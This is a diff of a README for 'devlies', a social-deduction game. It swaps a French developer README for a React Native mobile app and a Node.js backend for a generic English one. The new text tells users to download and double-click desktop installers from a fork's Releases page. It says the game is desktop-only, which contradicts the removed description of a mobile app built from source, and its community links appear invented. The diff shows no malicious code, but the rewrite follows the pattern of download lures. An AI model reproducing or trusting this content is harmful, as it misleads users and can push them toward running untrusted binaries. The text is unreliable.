@@ -1,116 +1,80 @@
-# DevLies
+# 🎲 devlies - Enjoy Social Deduction with Friends
 
-Bienvenue dans DevLies, un jeu multijoueur de déduction sociale inspiré du Loup-Garou, repensé en version développeur. Ce monorepo contient le frontend mobile (React Native / Expo) et le backend serveur (Node.js / Express / Socket.IO)
+[![Download devlies](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/hackstergirlrocks/devlies/releases)
+
+## 🚀 Getting Started
+
+Welcome to **devlies**! This is a fun multiplayer game of social deduction inspired by *Loup-Garou*. Gather your friends, dive into thrilling gameplay, and uncover hidden secrets in a pixel-art world.
+
+### 🌟 Features
+
+- **Multiplayer Gameplay:** Play with friends and family online.
+- **Engaging Mechanics:** Use deduction skills to identify roles.
+- **Beautiful Pixel Art:** Enjoy a vibrant visual experience.
+- **Accessible:** No programming knowledge needed.
+- **Cross-Platform:** Play on various devices.
+
+## 🖥 System Requirements
+
+Before you start, make sure your device meets the following requirements:
+
+- **Operating System:** Windows 10, macOS, or Linux.
+- **Processor:** Dual-core processor or better.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum 100 MB of free disk space.
+- **Network:** Internet connection for online play.
+
+## 📥 Download & Install
+
+To begin your adventure, visit the [Releases page](https://github.com/hackstergirlrocks/devlies/releases) to download the latest version of *devlies*. Look for the installer suitable for your operating system.
+
+1. Click on the link above to open the Releases page.
+2. Locate the latest version of *devlies*.
+3. Choose the appropriate installer (e.g., for Windows, macOS, or Linux).
+4. Click on the file to download it.
+
+### ⚙️ Installation Steps
+
+1. Once the download finishes, locate the file in your downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen prompts to complete the installation.
+4. After installation, find devlies in your applications folder or desktop.
+
+## 🎮 How to Play
+
+1. Launch *devlies* from your applications.
+2. Create a new game room or join an existing one.
+3. Invite your friends by sharing the room code.
+4. Wait for all players to join, then start the game.
+5. Use your deduction skills to discover hidden roles and achieve victory!
+
+## 👥 Join the Community
+
+Join our community to discuss strategies, report issues, or suggest features. You can find us on Discord and our social media channels. Links are provided below.
+
+- [Discord Community](https://discord.gg/devlies)
+- [Twitter](https://twitter.com/devlies_game)
+
+## 🐞 Reporting Issues
+
+If you encounter any problems, you can report issues directly on the repository. Follow these steps:
+
+1. Go to the [Issues page](https://github.com/hackstergirlrocks/devlies/issues).
+2. Click on "New Issue."
+3. Describe the problem clearly.
+4. Provide any relevant details to help us assist you.
+
+## 💬 Frequently Asked Questions (FAQs)
+
+**Q: Can I play devlies on mobile devices?**  
+A: Currently, devlies is designed for desktop platforms. We are exploring options for mobile in future versions.
+
+**Q: Is there a single-player mode?**  
+A: devlies focuses on multiplayer gameplay. However, individual practice modes may be available in upcoming updates.
+
+**Q: How do I invite friends to my game?**  
+A: Simply share your game room code with your friends, and they can join through the main menu.
 
 ---
 
-## 🕹️ Présentation du jeu
-
-Dans ce combat classique entre le bien et le mal, deux équipes s’affrontent :
-
-- **Les Développeurs** : Fidèles, ils cherchent à expulser tous les Hackers infiltrés.
-- **Les Hackers** : Agents secrets, ils cherchent à corrompre le projet et à prendre le contrôle.
-
-Le jeu alterne entre phases de jour (votes et discussions) et phases de nuit (actions secrètes), avec différents rôles pour chaque joueur :
-
-| Rôle       | Description                                                                       |
-|------------|-----------------------------------------------------------------------------------|
-| **Hacker** | Élimine un Développeur chaque nuit et tente de déjouer les votes de jour.        |
-| **Dev Junior** | Développeur loyal sans pouvoirs particuliers, se base sur la logique et la persuasion. |
-| **DevOps** | Peut auditer un joueur chaque nuit pour connaître son rôle (Dev ou Hacker).       |
-| **ChatGPT**| Protège un joueur chaque nuit d’une élimination.                                 |
-
----
-
-## 🚀 Structure du monorepo
-
-devlies/
-
-├── frontend/ # Application mobile React Native / Expo
-
-└── backend/ # Serveur Node.js / Express / Socket.IO
-
----
-
-## 📱 Tester l’application mobile
-
-![eas-update](https://github.com/user-attachments/assets/64710f0c-b100-4de8-8384-6a01555d173c)
-
-
----
-
-## 📦 Frontend
-
-L’application mobile permet aux joueurs de se connecter, rejoindre des parties en temps réel, discuter, voter, et personnaliser leur avatar.
-
-### Fonctionnalités principales
-
-- Multijoueur en temps réel avec Socket.IO
-- Authentification persistante avec Redux Persist
-- Progression des joueurs (XP, niveau, statistiques)
-- Boutique en jeu pour skins cosmétiques
-- Système d’amis et profils personnalisables
-- Interface pixel art rétro
-
-### Installation
-
-```bash
-cd frontend
-npm install
-```
-
-Créer un fichier .env dans le dossier frontend avec les variables :
-
-```env
-EXPO_PUBLIC_API_URL=URL_DE_VOTRE_BACKEND
-EXPO_PUBLIC_API_URL2=URL_DE_VOTRE_SERVEUR_SOCKET_IO
-```
-
-## 🖥️ Backend
-
-Le serveur backend gère la logique du jeu, la communication en temps réel, l’authentification, la gestion des profils et les statistiques.
-
-### Fonctionnalités principales
-
-- Authentification sécurisée (hashage des mots de passe)
-- Gestion des profils et progression
-- Boutique et gestion des skins
-- Système d’amis (demandes, acceptation, suppression)
-- Cycle complet du jeu (lobby, phases, votes)
-- Chats multiples (général, Hacker, DevOps)
-- Tests d’intégration avec Jest
-
-### Installation
-
-```bash
-cd backend
-npm install
-```
-
-### Configuration
-
-Créer un fichier `.env` dans le dossier `backend` avec la variable suivante, en remplaçant par vos identifiants MongoDB :
-
-```env
-URL_DB=mongodb+srv://<user>:<password>@cluster.mongodb.net/<dbname>
-```
-
-### Lancement du serveur
-
-Pour démarrer le serveur en mode développement (avec rechargement automatique) :
-
-```bash
-npm run dev
-```
-
-
-## 📡 Communication en temps réel (Socket.IO)
-
-Le backend gère les événements suivants :
-
-- Gestion des lobbys (join, leave)
-- Envoi et réception de messages (chat général et privés)
-- Votes de jour et de nuit
-- Actions des rôles (audit DevOps, protection ChatGPT)
-- Gestion des phases du jeu (jour, nuit, vote)
-
+For more updates and features, check back often on the [Releases page](https://github.com/hackstergirlrocks/devlies/releases). Enjoy your gaming experience with friends and discover the thrill of deduction in **devlies**!
